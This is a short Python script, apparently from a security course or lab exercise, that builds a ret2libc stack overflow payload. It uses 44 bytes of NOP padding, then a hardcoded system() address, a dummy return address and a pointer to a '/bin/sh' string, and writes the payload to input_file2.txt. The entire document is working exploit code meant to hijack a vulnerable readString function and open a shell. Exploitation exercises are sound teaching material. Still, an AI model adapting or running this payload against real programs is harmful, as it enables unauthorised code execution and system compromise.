import struct

# we add padding since the start of our input in the stack has 44-bytes gap until the return address of readString
padding = b'\x90'*44

# we need to write the address in reverse using this command because Linux Intel x86 is little endian 
system_address = struct.pack("I", 0xf7df0780)

# 4-byte payload to maintain payload structure as explained in the video
ret_after_system = b"AAAA"

# we need to write the address in reverse using this command because Linux Intel x86 is little endian
bin_sh = struct.pack("I", 0xf7f3d363)

exploit_payload = padding + system_address + ret_after_system + bin_sh

# write the exploit payload to input_file2.txt
with open('input_file2.txt', 'wb') as file:
    file.write(exploit_payload)